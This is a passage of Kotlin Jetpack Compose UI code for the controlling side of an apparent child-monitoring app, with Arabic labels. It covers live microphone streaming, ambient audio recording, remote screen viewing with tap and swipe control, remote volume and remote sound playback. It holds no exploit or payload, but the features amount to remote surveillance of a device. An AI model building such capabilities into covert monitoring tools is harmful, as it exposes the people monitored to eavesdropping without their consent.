                                horizontalArrangement = Arrangement.Center
                            ) {
                                Box(modifier = Modifier.size(8.dp).background(Color(0xFF22C55E), CircleShape))
                                Spacer(Modifier.width(8.dp))
                                Text("البث المباشر المفتوح يعمل الآن", color = Color(0xFF22C55E), fontSize = 13.sp, fontWeight = FontWeight.SemiBold)
                            }
                        }

                        Button(
                            onClick = { viewModel.stopMicStream() },
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFEF4444)),
                            shape = RoundedCornerShape(14.dp),
                            modifier = Modifier.fillMaxWidth().height(52.dp)
                        ) {
                            Icon(Icons.Default.Stop, null, tint = Color.White)
                            Spacer(Modifier.width(8.dp))
                            Text("إيقاف البث الحي", fontSize = 15.sp, fontWeight = FontWeight.Bold)
                        }
                    } else {
                        Button(
                            onClick = { viewModel.startMicStream() },
                            enabled = !isLoading,
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF3B82F6)),
                            shape = RoundedCornerShape(14.dp),
                            modifier = Modifier.fillMaxWidth().height(52.dp)
                        ) {
                            if (isLoading) {
                                CircularProgressIndicator(color = Color.White, modifier = Modifier.size(20.dp), strokeWidth = 2.dp)
                                Spacer(Modifier.width(8.dp))
                                Text("جاري الاتصال...", fontSize = 15.sp, fontWeight = FontWeight.Bold)
                            } else {
                                Icon(Icons.Default.PlayArrow, null, tint = Color.White)
                                Spacer(Modifier.width(8.dp))
                                Text("بدء الاستماع الآن", fontSize = 15.sp, fontWeight = FontWeight.Bold)
                            }
                        }
                    }
                    
                    if (micStreamState.error != null) {
                        Spacer(modifier = Modifier.height(16.dp))
                        Card(
                            colors = CardDefaults.cardColors(containerColor = Color(0xFF7F1D1D).copy(alpha = 0.2f)),
                            border = BorderStroke(1.dp, Color(0xFF7F1D1D)),
                            shape = RoundedCornerShape(12.dp),
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Row(
                                modifier = Modifier.padding(12.dp),
                                verticalAlignment = Alignment.CenterVertically
                            ) {
                                Icon(Icons.Default.ErrorOutline, null, tint = Color(0xFFFCA5A5), modifier = Modifier.size(16.dp))
                                Spacer(Modifier.width(8.dp))
                                Text(text = micStreamState.error!!, color = Color(0xFFFCA5A5), fontSize = 12.sp)
                            }
                        }
                    }
                }
            }
        }
    }
}

@Composable
fun AudioRecordRequirementsPage(viewModel: AdminViewModel) {
    val context = LocalContext.current
    val audioRecordsState by viewModel.audioRecordsState.collectAsState()
    val isAudioPlaying by viewModel.isAudioPlaying.collectAsState()
    val audioDuration by viewModel.audioDuration.collectAsState()
    val audioPosition by viewModel.audioPosition.collectAsState()
    val playingFileUrl by viewModel.playingFileUrl.collectAsState()
    val audioLoadingUrl by viewModel.audioLoadingUrl.collectAsState()

    // Pulse animation for playing sound
    val infiniteTransition = rememberInfiniteTransition(label = "pulse")
    val pulseAlpha by infiniteTransition.animateFloat(
        initialValue = 0.4f,
        targetValue = 1.0f,
        animationSpec = infiniteRepeatable(
            animation = tween(800, easing = LinearEasing),
            repeatMode = RepeatMode.Reverse
        ),
        label = "pulseAlpha"
    )

    LazyColumn(
        modifier = Modifier
            .fillMaxSize()
            .background(Color(0xFF0B0F19))
            .padding(14.dp),
        verticalArrangement = Arrangement.spacedBy(14.dp)
    ) {
        // Main request card
        item {
            Card(
                colors = CardDefaults.cardColors(containerColor = Color(0xFF1E293B)),
                border = BorderStroke(1.dp, Color(0xFF334155)),
                shape = RoundedCornerShape(16.dp),
                modifier = Modifier.fillMaxWidth()
            ) {
                Column(
                    modifier = Modifier.padding(18.dp),
                    horizontalAlignment = Alignment.CenterHorizontally
                ) {
                    Box(
                        modifier = Modifier
                            .size(64.dp)
                            .background(Color(0xFF00E5FF).copy(alpha = 0.15f), CircleShape),
                        contentAlignment = Alignment.Center
                    ) {
                        Icon(
                            imageVector = Icons.Default.Mic,
                            contentDescription = null,
                            tint = Color(0xFF00E5FF),
                            modifier = Modifier.size(32.dp)
                        )
                    }
                    Spacer(Modifier.height(12.dp))
                    Text(
                        text = "الأصوات المحيطة",
                        color = Color.White,
                        fontSize = 18.sp,
                        fontWeight = FontWeight.Bold
                    )
                    Spacer(Modifier.height(4.dp))
                    Text(
                        text = "قم بتسجيل أصوات البيئة المحيطة بهاتف الطفل بالوقت الحقيقي والاستماع إليها لاحقًا.",
                        color = Color(0xFF94A3B8),
                        fontSize = 12.sp,
                        textAlign = TextAlign.Center,
                        modifier = Modifier.padding(horizontal = 8.dp)
                    )
                    Spacer(Modifier.height(18.dp))
                    Button(
                        onClick = { viewModel.requestAudioRecord() },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00E5FF)),
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(48.dp),
                        shape = RoundedCornerShape(12.dp)
                    ) {
                        Text("طلب تسجيل صوتي فوري (10ث)", color = Color.Black, fontWeight = FontWeight.Bold, fontSize = 13.sp)
                    }
                }
            }
        }

        // Section header
        item {
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(vertical = 4.dp),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Text(
                    text = "سجل التسجيلات الصوتية",
                    color = Color.White,
                    fontSize = 15.sp,
                    fontWeight = FontWeight.Bold
                )
                
                IconButton(
                    onClick = { 
                        viewModel.selectedDeviceToken.value?.let { 
                            viewModel.refreshAudioRecords(it) 
                        }
                    },
                    modifier = Modifier
                        .size(32.dp)
                        .background(Color(0xFF1E293B), CircleShape)
                ) {
                    Icon(
                        imageVector = Icons.Default.Refresh,
                        contentDescription = "تحديث",
                        tint = Color(0xFF00E5FF),
                        modifier = Modifier.size(16.dp)
                    )
                }
            }
        }

        // State-driven rendering
        when (val state = audioRecordsState) {
            is AudioRecordsState.Loading -> {
                item {
                    Box(
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(200.dp),
                        contentAlignment = Alignment.Center
                    ) {
                        Column(horizontalAlignment = Alignment.CenterHorizontally) {
                            CircularProgressIndicator(color = Color(0xFF00E5FF))
                            Spacer(Modifier.height(12.dp))
                            Text("جاري تحميل التسجيلات...", color = Color(0xFF94A3B8), fontSize = 12.sp)
                        }
                    }
                }
            }
            is AudioRecordsState.Empty -> {
                item {
                    Box(
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(160.dp),
                        contentAlignment = Alignment.Center
                    ) {
                        Column(horizontalAlignment = Alignment.CenterHorizontally) {
                            Text("🔊", fontSize = 32.sp)
                            Spacer(Modifier.height(8.dp))
                            Text("لا توجد تسجيلات حتى الآن", color = Color(0xFF94A3B8), fontSize = 13.sp, fontWeight = FontWeight.Medium)
                            Text("اضغط على الزر بالأعلى لإرسال طلب تسجيل جديد.", color = Color(0xFF64748B), fontSize = 11.sp, textAlign = TextAlign.Center)
                        }
                    }
                }
            }
            is AudioRecordsState.Error -> {
                item {
                    Card(
                        colors = CardDefaults.cardColors(containerColor = Color(0xFF7F1D1D).copy(alpha = 0.2f)),
                        border = BorderStroke(1.dp, Color(0xFF7F1D1D)),
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Column(
                            modifier = Modifier.padding(16.dp),
                            horizontalAlignment = Alignment.CenterHorizontally
                        ) {
                            Text("⚠️", fontSize = 24.sp)
                            Spacer(Modifier.height(8.dp))
                            Text(state.message, color = Color(0xFFFECDD3), fontSize = 12.sp, textAlign = TextAlign.Center)
                        }
                    }
                }
            }
            is AudioRecordsState.Success -> {
                items(state.records) { record ->
                    val isCurrent = playingFileUrl == record.file_url
                    val isLoading = audioLoadingUrl == record.file_url

                    Card(
                        colors = CardDefaults.cardColors(
                            containerColor = if (isCurrent) Color(0xFF0F172A) else Color(0xFF1E293B)
                        ),
                        border = BorderStroke(
                            width = 1.dp,
                            color = if (isCurrent) Color(0xFF00E5FF) else Color(0xFF334155)
                        ),
                        shape = RoundedCornerShape(16.dp),
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Column(modifier = Modifier.padding(14.dp)) {
                            // Header Row
                            Row(
                                verticalAlignment = Alignment.CenterVertically,
                                modifier = Modifier.fillMaxWidth()
                            ) {
                                Box(
                                    modifier = Modifier
                                        .size(40.dp)
                                        .graphicsLayer {
                                            if (isCurrent && isAudioPlaying) {
                                                alpha = pulseAlpha
                                                scaleX = 1.0f + (1.0f - pulseAlpha) * 0.15f
                                                scaleY = 1.0f + (1.0f - pulseAlpha) * 0.15f
                                            }
                                        }
                                        .background(
                                            if (isCurrent) Color(0xFF00E5FF).copy(alpha = 0.15f) else Color(0xFF334155),
                                            CircleShape
                                        ),
                                    contentAlignment = Alignment.Center
                                ) {
                                    Text(
                                        text = if (isCurrent && isAudioPlaying) "🔊" else "🎙️",
                                        fontSize = 18.sp
                                    )
                                }
                                
                                Spacer(Modifier.width(10.dp))
                                
                                Column(modifier = Modifier.weight(1f)) {
                                    Text(
                                        text = "تسجيل صوتي محيطي",
                                        color = Color.White,
                                        fontSize = 13.sp,
                                        fontWeight = FontWeight.Bold
                                    )
                                    Spacer(Modifier.height(2.dp))
                                    val formattedTime = remember(record.created_at) {
                                        try {
                                            if (record.created_at != null) {
                                                val clean = record.created_at.substringBefore(".")
                                                    .replace("T", " ")
                                                    .replace("Z", "")
                                                clean
                                            } else "تاريخ غير معروف"
                                        } catch (e: Exception) {
                                            record.created_at ?: ""
                                        }
                                    }
                                    Text(
                                        text = formattedTime,
                                        color = Color(0xFF94A3B8),
                                        fontSize = 10.sp
                                    )
                                    Text(
                                        text = "الجهاز: ${record.token.takeLast(6)}",
                                        color = Color(0xFF64748B),
                                        fontSize = 9.sp
                                    )
                                }

                                // Share Button
                                IconButton(onClick = {
                                    val intent = Intent(Intent.ACTION_SEND).apply {
                                        type = "text/plain"
                                        putExtra(Intent.EXTRA_TEXT, "تسجيل صوتي من هاتف الطفل: ${record.file_url}")
                                    }
                                    context.startActivity(Intent.createChooser(intent, "مشاركة رابط الصوت"))
                                }) {
                                    Icon(
                                        imageVector = Icons.Default.Share,
                                        contentDescription = "مشاركة",
                                        tint = Color(0xFF00E5FF),
                                        modifier = Modifier.size(18.dp)
                                    )
                                }
                            }

                            Spacer(modifier = Modifier.height(14.dp))

                            // Player row
                            Row(
                                verticalAlignment = Alignment.CenterVertically,
                                modifier = Modifier.fillMaxWidth()
                            ) {
                                if (isLoading) {
                                    CircularProgressIndicator(
                                        color = Color(0xFF00E5FF),
                                        modifier = Modifier.size(36.dp),
                                        strokeWidth = 3.dp
                                    )
                                } else {
                                    IconButton(
                                        onClick = { viewModel.playAudioFromUrl(record.file_url) },
                                        modifier = Modifier
                                            .size(36.dp)
                                            .background(
                                                if (isCurrent) Color(0xFF00E5FF) else Color(0xFF334155),
                                                CircleShape
                                            )
                                    ) {
                                        Icon(
                                            imageVector = if (isCurrent && isAudioPlaying) Icons.Filled.Pause else Icons.Filled.PlayArrow,
                                            contentDescription = if (isCurrent && isAudioPlaying) "إيقاف مؤقت" else "تشغيل",
                                            tint = if (isCurrent) Color.Black else Color.White,
                                            modifier = Modifier.size(20.dp)
                                        )
                                    }
                                }

                                Spacer(Modifier.width(12.dp))

                                Column(modifier = Modifier.weight(1f)) {
                                    val position = if (isCurrent) audioPosition.toFloat() else 0f
                                    val duration = if (isCurrent) audioDuration.toFloat() else 100f
                                    val progress = if (duration > 0) position / duration else 0f

                                    Slider(
                                        value = progress,
                                        onValueChange = { newProg ->
                                            if (isCurrent && duration > 0) {
                                                viewModel.seekAudio((newProg * duration).toInt())
                                            }
                                        },
                                        modifier = Modifier.height(24.dp),
                                        colors = SliderDefaults.colors(
                                            thumbColor = if (isCurrent) Color(0xFF00E5FF) else Color(0xFF64748B),
                                            activeTrackColor = if (isCurrent) Color(0xFF00E5FF) else Color(0xFF475569),
                                            inactiveTrackColor = Color(0xFF334155)
                                        )
                                    )

                                    Row(
                                        modifier = Modifier.fillMaxWidth(),
                                        horizontalArrangement = Arrangement.SpaceBetween
                                    ) {
                                        val curTimeSec = if (isCurrent) audioPosition / 1000 else 0
                                        val totalTimeSec = if (isCurrent) audioDuration / 1000 else 0
                                        
                                        Text(
                                            text = String.format("%02d:%02d", curTimeSec / 60, curTimeSec % 60),
                                            color = Color(0xFF94A3B8),
                                            fontSize = 9.sp
                                        )
                                        Text(
                                            text = String.format("%02d:%02d", totalTimeSec / 60, totalTimeSec % 60),
                                            color = Color(0xFF94A3B8),
                                            fontSize = 9.sp
                                        )
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        
        item {
            Spacer(modifier = Modifier.height(90.dp))
        }
    }
}

@Composable
fun RemoteControlTab(viewModel: AdminViewModel) {
    val isStreamingActive by remember(viewModel) { viewModel.liveStreamState.map { it?.isActive == true }.distinctUntilChanged() }.collectAsState(initial = false)
    var controlContainerSize by remember { mutableStateOf(IntSize.Zero) }

    Column(
        modifier = Modifier.fillMaxSize().padding(14.dp),
        verticalArrangement = Arrangement.spacedBy(12.dp)
    ) {
        Card(
            colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
            border = BorderStroke(1.dp, if(isStreamingActive) Color(0xFF2196F3) else Color(0xFFE5E7EB)),
            modifier = Modifier.fillMaxWidth()
        ) {
            Column(modifier = Modifier.padding(14.dp)) {
                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                    Text("التحكم التفاعلي باللمس", color = Color(0xFF1F2937), fontSize = 13.sp, fontWeight = FontWeight.Bold)
                    Text(if (isStreamingActive) "مراقب" else "غير متصل", color = if (isStreamingActive) Color(0xFF39D353) else Color(0xFFFF4081), fontSize = 11.sp)
                }
                Spacer(modifier = Modifier.height(10.dp))
                
                Box(
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(450.dp)
                        .clip(RoundedCornerShape(8.dp))
                        .background(Color.Black)
                        .border(1.dp, Color(0xFFE5E7EB))
                        .onSizeChanged { controlContainerSize = it }
                        .pointerInput(isStreamingActive) {
                            if (!isStreamingActive) return@pointerInput
                            detectTapGestures(
                                onTap = { offset ->
                                    if (controlContainerSize.width > 0 && controlContainerSize.height > 0) {
                                        val normalizedX = (offset.x / controlContainerSize.width) * 100f
                                        val normalizedY = (offset.y / controlContainerSize.height) * 100f
                                        viewModel.sendRemoteClick(normalizedX, normalizedY)
                                    }
                                }
                            )
                        }
                        .pointerInput(isStreamingActive) {
                            if (!isStreamingActive) return@pointerInput
                            var startPoint = Offset.Zero
                            var endPoint = Offset.Zero
                            detectDragGestures(
                                onDragStart = { startPoint = it },
                                onDragEnd = {
                                    if (controlContainerSize.width > 0 && controlContainerSize.height > 0) {
                                        val x1 = (startPoint.x / controlContainerSize.width) * 100f
                                        val y1 = (startPoint.y / controlContainerSize.height) * 100f
                                        val x2 = (endPoint.x / controlContainerSize.width) * 100f
                                        val y2 = (endPoint.y / controlContainerSize.height) * 100f
                                        
                                        // Only send if it's a real swipe (not just a jittery tap)
                                        val dist = kotlin.math.sqrt((startPoint.x - endPoint.x)*(startPoint.x - endPoint.x) + (startPoint.y - endPoint.y)*(startPoint.y - endPoint.y))
                                        if (dist > 30) {
                                            viewModel.sendRemoteSwipe(x1, y1, x2, y2)
                                        }
                                    }
                                },
                                onDrag = { change, dragAmount ->
                                    change.consume()
                                    endPoint = change.position
                                }
                            )
                        },
                    contentAlignment = Alignment.Center
                ) {
                    val bitmap by produceState<Bitmap?>(initialValue = null, viewModel) {
                        viewModel.liveStreamState.map { Pair(it?.image, it?.timestamp) }.distinctUntilChanged().conflate().collect { pair ->
                            val imgStr = pair.first
                            value = kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) { imgStr?.let { com.example.admin.LiveStreamState(image = it).toBitmap() } }
                        }
                    }
                    if (isStreamingActive && bitmap != null) {
                        Image(
                            bitmap!!.asImageBitmap(), 
                            null, 
                            modifier = Modifier.fillMaxSize(), 
                            contentScale = ContentScale.Fit
                        )
                    } else if (isStreamingActive) {
                        CircularProgressIndicator(color = Color(0xFF2196F3))
                    } else {
                        Column(horizontalAlignment = Alignment.CenterHorizontally) {
                            Icon(Icons.Default.SettingsRemote, null, tint = Color(0xFF6B7280), modifier = Modifier.size(48.dp))
                            Spacer(Modifier.height(8.dp))
                            Text("البث والتحكم غير مفعل.", color = Color(0xFF6B7280), fontSize = 12.sp)
                        }
                    }
                }
                
                Spacer(modifier = Modifier.height(16.dp))
                
                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(10.dp)) {
                    Button(
                        onClick = { viewModel.startLiveStream() }, 
                        enabled = !isStreamingActive, 
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF238636)), 
                        modifier = Modifier.weight(1f)
                    ) {
                        Icon(Icons.Default.PlayArrow, null, modifier = Modifier.size(18.dp))
                        Spacer(Modifier.width(8.dp))
                        Text("بدء العرض")
                    }
                    Button(
                        onClick = { viewModel.stopLiveStream() }, 
                        enabled = isStreamingActive, 
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFEF4444)), 
                        modifier = Modifier.weight(1f)
                    ) {
                        Icon(Icons.Default.Stop, null, modifier = Modifier.size(18.dp))
                        Spacer(Modifier.width(8.dp))
                        Text("إيقاف")
                    }
                }
                
                if (isStreamingActive) {
                    Spacer(Modifier.height(12.dp))
                    Text(
                        "استخدم اللمس للنقر على شاشة الطفل مباشرة. سيتم إرسال إحداثيات اللمس ونسبتها المئوية تلقائياً للتنفيذ.",
                        color = Color(0xFF6B7280),
                        fontSize = 11.sp,
                        textAlign = TextAlign.Center,
                        modifier = Modifier.fillMaxWidth()
                    )
                }
            }
        }
    }
}

@Composable
fun VolumeControlTab(viewModel: AdminViewModel) {
    var volume by remember { mutableFloatStateOf(50f) }
    var confirmedVolume by remember { mutableFloatStateOf(50f) }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(14.dp),
        verticalArrangement = Arrangement.spacedBy(16.dp)
    ) {
        Card(
            colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
            border = BorderStroke(1.dp, Color(0xFFE5E7EB)),
            modifier = Modifier.fillMaxWidth()
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Text("التحكم في مستوى صوت الهاتف عن بعد", color = Color(0xFF1F2937), fontWeight = FontWeight.Bold, fontSize = 14.sp)
                Spacer(modifier = Modifier.height(16.dp))
                
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Icon(Icons.Default.VolumeMute, "صامت", tint = Color(0xFF6B7280))
                    Slider(
                        value = volume,
                        onValueChange = { volume = it },
                        valueRange = 0f..100f,
                        modifier = Modifier.weight(1f),
                        colors = SliderDefaults.colors(
                            thumbColor = Color(0xFFFFA726),
                            activeTrackColor = Color(0xFFFFA726)
                        )
                    )
                    Icon(Icons.Default.VolumeUp, "مرتفع", tint = Color(0xFFFFA726))
                }
                Text("مستوى الصوت المروّس الحالي: ${volume.toInt()}%", color = Color(0xFF6B7280), fontSize = 12.sp, modifier = Modifier.align(Alignment.CenterHorizontally))

                val hasVolumeChanged = volume.toInt() != confirmedVolume.toInt()
                if (hasVolumeChanged) {
                    Spacer(modifier = Modifier.height(16.dp))
                    Button(
                        onClick = {
                            viewModel.setRemoteVolume(volume.toInt())
                            confirmedVolume = volume
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFFFA726)),
                        modifier = Modifier.fillMaxWidth(),
                        shape = RoundedCornerShape(12.dp)
                    ) {
                        Icon(Icons.Default.Check, contentDescription = "تأكيد")
                        Spacer(modifier = Modifier.width(8.dp))
                        Text("تأكيد ضبط الصوت", fontWeight = FontWeight.Bold, fontSize = 13.sp)
                    }
                }
            }
        }
        
        Text(
            "ضبط مستوى الصوت عن بعد يقوم بتغيير مستوى صوت رنين وسائط هاتف الطفل بالوقت الحقيقي.",
            color = Color(0xFF6B7280),
            fontSize = 12.sp,
            textAlign = TextAlign.Center,
            modifier = Modifier.padding(horizontal = 8.dp)
        )
    }
}

@Composable
fun AudioControlTab(viewModel: AdminViewModel) {
    var playVolume by remember { mutableFloatStateOf(80f) }
    var soundName by remember { mutableStateOf("") }
    var expanded by remember { mutableStateOf(false) }
    
    val commandResponse by viewModel.commandResponse.collectAsState()
    val activeCommand by viewModel.activeCommandProgress.collectAsState()
    val availableSounds by viewModel.availableSounds.collectAsState()

    var playingDurationSec by remember { mutableIntStateOf(0) }
    var currentPlayTimeSec by remember { mutableIntStateOf(0) }
    var isPlaying by remember { mutableStateOf(false) }

    LaunchedEffect(commandResponse) {
        val type = activeCommand?.commandType ?: ""
        if (type == "play_remote_sound" && commandResponse?.first == "success") {
            val msg = commandResponse?.second ?: ""
            val extractedNumber = Regex("\\d+").find(msg)?.value?.toIntOrNull() ?: 30
            val durationSec = if (extractedNumber > 1000) extractedNumber / 1000 else extractedNumber
            
            if (durationSec > 0 && !isPlaying) {
                playingDurationSec = durationSec
                currentPlayTimeSec = 0
                isPlaying = true
            }
        }
    }

    LaunchedEffect(isPlaying) {
        if (isPlaying) {
            while (currentPlayTimeSec < playingDurationSec) {
                delay(1000)
                currentPlayTimeSec++
            }
            isPlaying = false
        }
    }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(14.dp),
        verticalArrangement = Arrangement.spacedBy(16.dp)
    ) {
        Card(
            colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
            border = BorderStroke(1.dp, Color(0xFFE5E7EB)),
            modifier = Modifier.fillMaxWidth()
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Text(
                    text = "تشغيل أصوات تنبيهية على هاتف الطفل", 
                    color = Color(0xFF1F2937), 
                    fontWeight = FontWeight.Bold, 
                    fontSize = 14.sp
                )
                Spacer(modifier = Modifier.height(16.dp))

                // Row 1: Dropdown Box (Left) & Fetch "جلب" Button (Right)
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.spacedBy(8.dp),
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Box(modifier = Modifier.weight(1f)) {
                        OutlinedTextField(
                            value = soundName,
                            onValueChange = { },
                            readOnly = true,
                            label = { 
                                Text(
                                    text = "اختر الصوت المتوفر", 
                                    color = Color(0xFF334155), 
                                    fontWeight = FontWeight.Bold, 
                                    fontSize = 12.sp
                                ) 
                            },
                            textStyle = androidx.compose.ui.text.TextStyle(
                                color = Color(0xFF0F172A),
                                fontWeight = FontWeight.Bold,
                                fontSize = 14.sp
                            ),
                            modifier = Modifier.fillMaxWidth(),
                            trailingIcon = {
                                IconButton(onClick = { expanded = !expanded }) {
                                    Icon(
                                        imageVector = if (expanded) Icons.Default.ArrowDropUp else Icons.Default.ArrowDropDown,
                                        contentDescription = "قائمة الأصوات",
                                        tint = Color(0xFF1E88E5),
                                        modifier = Modifier.size(24.dp)
                                    )
                                }
                            },
                            colors = OutlinedTextFieldDefaults.colors(
                                focusedBorderColor = Color(0xFF1E88E5),
                                unfocusedBorderColor = Color(0xFF64748B),
                                focusedLabelColor = Color(0xFF0F172A),
                                unfocusedLabelColor = Color(0xFF334155),
                                focusedContainerColor = Color(0xFFF8FAFC),
                                unfocusedContainerColor = Color(0xFFFFFFFF),
                                focusedTextColor = Color(0xFF0F172A),
                                unfocusedTextColor = Color(0xFF0F172A)
                            ),
                            shape = RoundedCornerShape(12.dp)
                        )
                        // Invisible overlay to trigger dropdown on text field click
                        Box(
                            modifier = Modifier
                                .matchParentSize()
                                .clickable { expanded = !expanded }
                        )
                        DropdownMenu(
                            expanded = expanded,
                            onDismissRequest = { expanded = false },
                            modifier = Modifier
                                .fillMaxWidth(0.9f)
                                .background(Color(0xFF1E293B), shape = RoundedCornerShape(16.dp))
                                .border(1.5.dp, Color(0xFF2196F3), shape = RoundedCornerShape(16.dp))
                        ) {
                            if (availableSounds.isEmpty()) {
                                DropdownMenuItem(
                                    text = {
                                        Row(verticalAlignment = Alignment.CenterVertically) {
                                            Icon(
                                                imageVector = Icons.Default.Info,
                                                contentDescription = null,
                                                tint = Color(0xFF94A3B8),
                                                modifier = Modifier.size(16.dp)
                                            )
                                            Spacer(modifier = Modifier.width(8.dp))
                                            Text(
                                                text = "لا توجد أصوات محملة، انقر على جلب",
                                                color = Color(0xFF94A3B8),
                                                fontSize = 12.sp,
                                                fontWeight = FontWeight.Medium
                                            )
                                        }
                                    },
                                    onClick = { expanded = false },
                                    enabled = false,
                                    colors = androidx.compose.material3.MenuDefaults.itemColors(
                                        disabledTextColor = Color(0xFF94A3B8)
                                    )
                                )
                            } else {
                                availableSounds.forEach { sound ->
                                    DropdownMenuItem(
                                        text = {
                                            Row(verticalAlignment = Alignment.CenterVertically) {
                                                Icon(
                                                    imageVector = Icons.Default.MusicNote,
                                                    contentDescription = null,
                                                    tint = Color(0xFFFFA726),
                                                    modifier = Modifier.size(16.dp)
                                                )
                                                Spacer(modifier = Modifier.width(8.dp))
                                                Text(
                                                    text = sound,
                                                    color = Color.White,
                                                    fontWeight = FontWeight.Bold,
                                                    fontSize = 14.sp
                                                )
                                            }
                                        },
                                        onClick = {
                                            soundName = sound
                                            expanded = false
                                        },
                                        colors = androidx.compose.material3.MenuDefaults.itemColors(
                                            textColor = Color.White
                                        )
                                    )
                                }
                            }
                        }
                    }

                    Button(
                        onClick = { viewModel.requestAvailableSounds() },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF2196F3)),
                        shape = RoundedCornerShape(12.dp),
                        modifier = Modifier.height(56.dp)
                    ) {
                        Icon(Icons.Default.Refresh, contentDescription = "جلب", modifier = Modifier.size(16.dp))
                        Spacer(modifier = Modifier.width(4.dp))
                        Text("جلب", fontSize = 12.sp, fontWeight = FontWeight.Bold)
                    }
                }

                Spacer(modifier = Modifier.height(16.dp))

                // Row 2: "تحديد الصوت" - independent play volume
                Text("درجة صوت التنبيه", color = Color(0xFF4B5563), fontSize = 12.sp, fontWeight = FontWeight.SemiBold)
                Spacer(modifier = Modifier.height(6.dp))
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Icon(Icons.Default.VolumeMute, "صامت", tint = Color(0xFF6B7280))
                    Slider(
                        value = playVolume,
                        onValueChange = { playVolume = it },
                        valueRange = 0f..100f,
                        modifier = Modifier.weight(1f),
                        colors = SliderDefaults.colors(
                            thumbColor = Color(0xFF2196F3),
                            activeTrackColor = Color(0xFF2196F3)
                        )
                    )
                    Icon(Icons.Default.VolumeUp, "مرتفع", tint = Color(0xFF2196F3))
                }
                Text("درجة الصوت المحددة للتشغيل: ${playVolume.toInt()}%", color = Color(0xFF4B5563), fontSize = 12.sp, modifier = Modifier.align(Alignment.CenterHorizontally))

                Spacer(modifier = Modifier.height(20.dp))

                // Row 3: Play Button & Stop Button
                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(12.dp)) {
                    Button(
                        onClick = { 
                            isPlaying = false
                            viewModel.playRemoteSound(soundName, playVolume.toInt()) 
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF4CAF50)),
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(12.dp),
                        enabled = soundName.isNotBlank()
                    ) {
                        Icon(Icons.Default.PlayArrow, null)
                        Spacer(Modifier.width(8.dp))
                        Text("تشغيل الصوت", fontSize = 13.sp, fontWeight = FontWeight.Bold)
                    }

                    Button(
                        onClick = { 
                            viewModel.stopRemoteSound()
                            isPlaying = false
                        },
                        colors = ButtonDefaults.buttonColors(
                            containerColor = if (isPlaying) Color(0xFFEF4444) else Color(0xFFE5E7EB),
                            contentColor = if (isPlaying) Color.White else Color(0xFF9CA3AF)
                        ),
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(12.dp),
                        enabled = isPlaying
                    ) {
                        Icon(Icons.Default.Stop, null)
                        Spacer(Modifier.width(8.dp))
                        Text("إيقاف", fontSize = 13.sp)
                    }
                }

                if (isPlaying) {
                    Spacer(modifier = Modifier.height(16.dp))
                    Column(modifier = Modifier.fillMaxWidth()) {
                        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
                            Text(
                                String.format("%02d:%02d", currentPlayTimeSec / 60, currentPlayTimeSec % 60), 
                                fontSize = 12.sp, 
                                color = Color(0xFF2196F3)
                            )
                            Text(
                                String.format("%02d:%02d", playingDurationSec / 60, playingDurationSec % 60), 
                                fontSize = 12.sp, 
                                color = Color(0xFF6B7280)
                            )
                        }
                        Spacer(modifier = Modifier.height(4.dp))
                        LinearProgressIndicator(
                            progress = { if (playingDurationSec > 0) currentPlayTimeSec.toFloat() / playingDurationSec.toFloat() else 0f },
                            modifier = Modifier.fillMaxWidth().height(6.dp),
                            color = Color(0xFF2196F3),
                            trackColor = Color(0xFFE5E7EB)
                        )
                    }
                }
            }
        }
        
        Card(
            colors = CardDefaults.cardColors(containerColor = Color(0xFFF9FAFB)),
            border = BorderStroke(1.5.dp, Color(0xFFE5E7EB)),
            modifier = Modifier.fillMaxWidth()
        ) {
            Column(modifier = Modifier.padding(14.dp)) {
                Text(
                    text = "الشكل المرسل لتطبيق الطفل (Payload):",
                    color = Color(0xFF374151),
                    fontWeight = FontWeight.Bold,
                    fontSize = 12.sp
                )
                Spacer(modifier = Modifier.height(8.dp))
                Text(
                    text = "Command: \"play_remote_sound\"\nParameters:\n{\n  \"Sound\": \"${if (soundName.isBlank()) "alarm" else soundName}\",\n  \"Volume\": ${playVolume.toInt()},\n  \"volume\": ${playVolume.toInt()}\n}",
                    fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace,
                    color = Color(0xFF0284C7),
                    fontSize = 11.sp,
                    lineHeight = 16.sp
                )
            }
        }

        Text(
